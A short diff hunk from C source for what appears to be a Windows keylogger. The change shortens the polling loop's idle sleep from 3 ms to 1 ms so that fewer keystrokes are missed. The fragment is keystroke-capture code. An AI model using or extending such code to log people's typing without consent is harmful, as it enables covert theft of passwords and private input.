@@ -582,10 +582,10 @@ int main()
                     the function secondary key states that can be toggled via the shift key.
                 */
                 LastKeyStrokeLogged=GrabKey(VkKeyScanExA(MapUnmapedVkeys[x].Primary,GetKeyboardLayout(0)),MapUnmapedVkeys[x].Primary,MapUnmapedVkeys[x].Secondary,LastKeyStrokeLogged);
-            /*if no keystrokes have been logged then sleep for 3 ms
+            /*if no keystrokes have been logged then sleep for 1 ms
              this still registers almost all keystrokes while reducing the amount of
              cpu time used to 0 while idle*/
-            if(gotchar)Sleep(3);
+            if(gotchar)Sleep(1);
         }
         else
         /*
